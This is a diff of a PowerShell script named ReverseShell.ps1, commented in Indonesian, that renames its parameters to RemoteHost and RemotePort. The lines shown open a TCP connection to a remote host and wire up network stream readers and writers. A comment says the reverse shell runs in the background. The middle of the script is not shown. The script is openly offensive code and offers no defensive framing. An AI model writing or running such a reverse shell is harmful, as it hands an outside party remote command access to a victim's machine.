@@ -1,18 +1,18 @@
 # ReverseShell.ps1
 param (
-    [string]$LHOST,
-    [int]$LPORT
+    [string]$RemoteHost,  # Ganti nama parameter
+    [int]$RemotePort      # Ganti nama parameter
 )
 
 # Fungsi untuk membuat koneksi reverse shell
 function Start-ReverseShell {
     param (
-        [string]$host,
-        [int]$port
+        [string]$RemoteHost,  # Ganti nama parameter
+        [int]$RemotePort      # Ganti nama parameter
     )
 
     # Membuat objek TCPClient dan menghubungkan ke host dan port
-    $TCPClient = New-Object Net.Sockets.TCPClient($host, $port)
+    $TCPClient = New-Object Net.Sockets.TCPClient($RemoteHost, $RemotePort)
     $NetworkStream = $TCPClient.GetStream()
     $StreamReader = New-Object IO.StreamReader($NetworkStream)
     $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
@@ -42,4 +42,4 @@ function Start-ReverseShell {
 }
 
 # Menjalankan fungsi reverse shell dalam latar belakang
-Start-ReverseShell -host $LHOST -port $LPORT
+Start-ReverseShell -RemoteHost $RemoteHost -RemotePort $RemotePort
